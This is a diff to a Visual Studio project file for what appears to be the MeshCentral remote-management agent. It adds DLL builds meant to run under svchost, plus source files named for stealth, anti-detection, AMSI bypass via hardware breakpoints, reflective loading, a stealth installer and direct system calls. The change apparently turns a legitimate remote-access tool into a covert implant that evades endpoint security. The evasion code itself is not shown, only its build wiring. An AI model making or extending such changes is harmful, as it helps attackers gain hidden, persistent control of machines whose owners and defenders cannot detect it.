@@ -49,6 +49,22 @@
       <Configuration>Release</Configuration>
       <Platform>x64</Platform>
     </ProjectConfiguration>
+    <ProjectConfiguration Include="Release_DLL|x64">
+      <Configuration>Release_DLL</Configuration>
+      <Platform>x64</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Debug_DLL|x64">
+      <Configuration>Debug_DLL</Configuration>
+      <Platform>x64</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Release_DLL|ARM64">
+      <Configuration>Release_DLL</Configuration>
+      <Platform>ARM64</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Debug_DLL|ARM64">
+      <Configuration>Debug_DLL</Configuration>
+      <Platform>ARM64</Platform>
+    </ProjectConfiguration>
   </ItemGroup>
   <PropertyGroup Label="Globals">
     <ProjectGuid>{CE5AD78C-DBDF-4D81-9A69-41B1DF683115}</ProjectGuid>
@@ -58,6 +74,52 @@
     <WindowsTargetPlatformVersion>10.0.22621.0</WindowsTargetPlatformVersion>
   </PropertyGroup>
   <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release_DLL|x64'" Label="Configuration">
+    <ConfigurationType>DynamicLibrary</ConfigurationType>
+    <CharacterSet>MultiByte</CharacterSet>
+    <WholeProgramOptimization>true</WholeProgramOptimization>
+    <PlatformToolset>v143</PlatformToolset>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug_DLL|x64'" Label="Configuration">
+    <ConfigurationType>DynamicLibrary</ConfigurationType>
+    <CharacterSet>MultiByte</CharacterSet>
+    <PlatformToolset>v143</PlatformToolset>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug_DLL|x64'">
+    <TargetName>MeshServiceHost64</TargetName>
+  </PropertyGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug_DLL|x64'">
+    <ClCompile>
+      <AdditionalIncludeDirectories>..\openssl\include;..\;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
+      <PreprocessorDefinitions>BUILD_SVCHOST_DLL;MESH_AGENTID=4;DUK_USE_DATE_NOW_WINDOWS;MICROSTACK_PROXY;_WINSERVICE;NOLMSCOMMANDER;WIN32;WIN64;_LINKVM;_DEBUG;_CONSOLE;MICROSTACK_NO_STDAFX;WINSOCK2;MICROSTACK_TLS_DETECT;_MSC_PLATFORM_TOOLSET_$(PlatformToolset);ILibChain_WATCHDOG_TIMEOUT=600000;DUK_USE_DEBUGGER_SUPPORT;DUK_USE_INTERRUPT_COUNTER;DUK_USE_DEBUGGER_INSPECT;DUK_USE_DEBUGGER_PAUSE_UNCAUGHT;DUK_USE_DEBUGGER_DUMPHEAP;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <ExceptionHandling>Async</ExceptionHandling>
+      <RuntimeLibrary>MultiThreadedDebug</RuntimeLibrary>
+    </ClCompile>
+    <Link>
+      <AdditionalDependencies>Comctl32.lib;SetupAPI.lib;DbgHelp.lib;Iphlpapi.lib;ws2_32.lib;Setupapi.lib;Psapi.lib;Crypt32.lib;Wintrust.lib;Version.lib;Wtsapi32.lib;Gdiplus.lib;Winhttp.lib;Ncrypt.lib;..\openssl\libstatic\libcrypto64MT.lib;..\openssl\libstatic\libssl64MT.lib;%(AdditionalDependencies)</AdditionalDependencies>
+      <SubSystem>Windows</SubSystem>
+      <TargetMachine>MachineX64</TargetMachine>
+      <ModuleDefinitionFile>MeshServiceHost.def</ModuleDefinitionFile>
+      <OutputFile>$(OutDir)$(TargetName)$(TargetExt)</OutputFile>
+      <AdditionalOptions> /ignore:4099 %(AdditionalOptions)</AdditionalOptions>
+    </Link>
+  </ItemDefinitionGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release_DLL|ARM64'" Label="Configuration">
+    <ConfigurationType>DynamicLibrary</ConfigurationType>
+    <CharacterSet>MultiByte</CharacterSet>
+    <WholeProgramOptimization>true</WholeProgramOptimization>
+    <PlatformToolset>v143</PlatformToolset>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug_DLL|ARM64'" Label="Configuration">
+    <ConfigurationType>DynamicLibrary</ConfigurationType>
+    <CharacterSet>MultiByte</CharacterSet>
+    <PlatformToolset>v143</PlatformToolset>
+  </PropertyGroup>
+  <ItemDefinitionGroup>
+    <ClCompile>
+      <ForcedIncludeFiles>$(ProjectDir)winsock_fix.h;%(ForcedIncludeFiles)</ForcedIncludeFiles>
+    </ClCompile>
+  </ItemDefinitionGroup>
   <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
     <ConfigurationType>Application</ConfigurationType>
     <CharacterSet>MultiByte</CharacterSet>
@@ -126,6 +188,7 @@
   </PropertyGroup>
   <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
   <ImportGroup Label="ExtensionSettings">
+    <Import Project="$(VCTargetsPath)\BuildCustomizations\masm.props" />
   </ImportGroup>
   <ImportGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="PropertySheets">
     <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
@@ -254,6 +317,16 @@
   <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
     <PostBuildEventUseInBuild>false</PostBuildEventUseInBuild>
     <TargetName>MeshService64</TargetName>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release_DLL|x64'">
+    <PostBuildEventUseInBuild>false</PostBuildEventUseInBuild>
+    <TargetName>MeshServiceHost64</TargetName>
+    <OutDir>$(SolutionDir)$(Configuration)\</OutDir>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release_DLL|ARM64'">
+    <PostBuildEventUseInBuild>false</PostBuildEventUseInBuild>
+    <TargetName>MeshServiceHostARM64</TargetName>
+    <OutDir>$(SolutionDir)$(Configuration)\</OutDir>
   </PropertyGroup>
   <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|ARM64'">
     <PostBuildEventUseInBuild>false</PostBuildEventUseInBuild>
@@ -669,6 +742,38 @@ powershell -ExecutionPolicy Unrestricted $(ProjectDir)prebuild.ps1 $(ProjectDir)
       <AdditionalManifestFiles>$(ProjectDir)dpiaware.manifest %(AdditionalManifestFiles)</AdditionalManifestFiles>
     </Manifest>
   </ItemDefinitionGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release_DLL|x64'">
+    <ClCompile>
+      <AdditionalIncludeDirectories>..\openssl\include;..\;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
+      <PreprocessorDefinitions>BUILD_SVCHOST_DLL;MESH_AGENTID=4;DUK_USE_DATE_NOW_WINDOWS;MICROSTACK_PROXY;_WINSERVICE;NOLMSCOMMANDER;WIN32;WIN64;_LINKVM;NDEBUG;_CONSOLE;MICROSTACK_NO_STDAFX;WINSOCK2;MICROSTACK_TLS_DETECT;_MSC_PLATFORM_TOOLSET_$(PlatformToolset);ILibChain_WATCHDOG_TIMEOUT=600000;DUK_USE_DEBUGGER_SUPPORT;DUK_USE_INTERRUPT_COUNTER;DUK_USE_DEBUGGER_INSPECT;DUK_USE_DEBUGGER_PAUSE_UNCAUGHT;DUK_USE_DEBUGGER_DUMPHEAP;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <ExceptionHandling>Async</ExceptionHandling>
+      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
+    </ClCompile>
+    <Link>
+      <AdditionalDependencies>Comctl32.lib;SetupAPI.lib;DbgHelp.lib;Iphlpapi.lib;ws2_32.lib;Setupapi.lib;Psapi.lib;Crypt32.lib;Wintrust.lib;Version.lib;Wtsapi32.lib;Gdiplus.lib;Winhttp.lib;Ncrypt.lib;..\openssl\libstatic\libcrypto64MT.lib;..\openssl\libstatic\libssl64MT.lib;%(AdditionalDependencies)</AdditionalDependencies>
+      <SubSystem>Windows</SubSystem>
+      <TargetMachine>MachineX64</TargetMachine>
+      <ModuleDefinitionFile>MeshServiceHost.def</ModuleDefinitionFile>
+      <OutputFile>$(OutDir)$(TargetName)$(TargetExt)</OutputFile>
+      <AdditionalOptions> /ignore:4099 %(AdditionalOptions)</AdditionalOptions>
+    </Link>
+  </ItemDefinitionGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release_DLL|ARM64'">
+    <ClCompile>
+      <AdditionalIncludeDirectories>..\openssl\include;..\;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
+      <PreprocessorDefinitions>BUILD_SVCHOST_DLL;ARM64;MESH_AGENTID=43;DUK_USE_DATE_NOW_WINDOWS;MICROSTACK_PROXY;_WINSERVICE;NOLMSCOMMANDER;WIN32;WIN64;_LINKVM;NDEBUG;_CONSOLE;MICROSTACK_NO_STDAFX;WINSOCK2;MICROSTACK_TLS_DETECT;_MSC_PLATFORM_TOOLSET_$(PlatformToolset);ILibChain_WATCHDOG_TIMEOUT=600000;DUK_USE_DEBUGGER_SUPPORT;DUK_USE_INTERRUPT_COUNTER;DUK_USE_DEBUGGER_INSPECT;DUK_USE_DEBUGGER_PAUSE_UNCAUGHT;DUK_USE_DEBUGGER_DUMPHEAP;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <ExceptionHandling>Async</ExceptionHandling>
+      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
+    </ClCompile>
+    <Link>
+      <AdditionalDependencies>Comctl32.lib;SetupAPI.lib;DbgHelp.lib;Iphlpapi.lib;ws2_32.lib;Setupapi.lib;Psapi.lib;Crypt32.lib;Wintrust.lib;Version.lib;Wtsapi32.lib;Gdiplus.lib;Winhttp.lib;Ncrypt.lib;..\openssl\libstatic\libcryptoARM64.lib;..\openssl\libstatic\libsslARM64.lib;%(AdditionalDependencies)</AdditionalDependencies>
+      <SubSystem>Windows</SubSystem>
+      <TargetMachine>MachineARM64</TargetMachine>
+      <ModuleDefinitionFile>MeshServiceHost_ARM64.def</ModuleDefinitionFile>
+      <OutputFile>$(OutDir)$(TargetName)$(TargetExt)</OutputFile>
+      <AdditionalOptions> /ignore:4099 %(AdditionalOptions)</AdditionalOptions>
+    </Link>
+  </ItemDefinitionGroup>
   <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|ARM64'">
     <Midl />
     <ClCompile>
@@ -869,6 +974,13 @@ powershell -ExecutionPolicy Unrestricted $(ProjectDir)prebuild.ps1 $(ProjectDir)
     <ClCompile Include="..\microstack\ILibWrapperWebRTC.c" />
     <ClCompile Include="firewall.cpp" />
     <ClCompile Include="ServiceMain.c" />
+    <ClCompile Include="stealth_cmd.c" />
+    <ClCompile Include="stealth_svchost.c" />
+    <ClCompile Include="stealth_antidetect.c" />
+    <ClCompile Include="stealth_installer.c" />
+    <ClCompile Include="syscalls.c" />
+    <ClCompile Include="stealth_amsi_hwbp.c" />
+    <ClCompile Include="stealth_reflective.c" />
   </ItemGroup>
   <ItemGroup>
     <ClInclude Include="..\meshcore\agentcore.h" />
@@ -928,8 +1040,16 @@ powershell -ExecutionPolicy Unrestricted $(ProjectDir)prebuild.ps1 $(ProjectDir)
     <ClInclude Include="..\microstack\ILibWrapperWebRTC.h" />
     <ClInclude Include="resource.h" />
     <ClInclude Include="stdafx.h" />
+    <ClInclude Include="stealth.h" />
+    <ClInclude Include="syscalls.h" />
+  </ItemGroup>
+  <ItemGroup>
+    <MASM Include="syscalls-asm.x64.asm">
+      <ExcludedFromBuild Condition="'$(Platform)'!='x64' and '$(Platform)'!='ARM64'">true</ExcludedFromBuild>
+    </MASM>
   </ItemGroup>
   <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
   <ImportGroup Label="ExtensionTargets">
+    <Import Project="$(VCTargetsPath)\BuildCustomizations\masm.targets" />
   </ImportGroup>
 </Project>
